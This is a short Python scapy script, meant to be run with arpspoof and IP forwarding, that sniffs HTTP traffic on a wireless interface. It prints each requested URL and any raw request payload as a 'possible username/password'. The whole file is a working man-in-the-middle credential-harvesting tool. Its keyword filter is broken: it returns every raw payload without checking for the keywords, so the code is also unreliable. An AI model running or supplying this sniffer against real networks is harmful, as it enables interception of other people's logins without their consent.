#!/usr/bin/env python
#use with arpspoof
#echo 1 > /proc/sys/net/ipv4/ip_forward
import scapy.all as scapy
from scapy.layers import http
def sniff(interface):
	scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
def get_url(packet):
	return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
	if packet.haslayer(scapy.Raw):
			load = str(packet[scapy.Raw].load)
			keywords = ["username", "user", "password", "pass"]
			for keyword in keywords:
				return load
				
def process_sniffed_packet(packet):
	if packet.haslayer(http.HTTPRequest):
		url = get_url(packet)
		print("[+] HTTP Request >>" + url.decode())
		login_info = get_login_info(packet)
		if login_info:
			print("\n\n[+] Possible username/passwrd> " + login_info + "\n\n")
				
		
sniff("wlan0")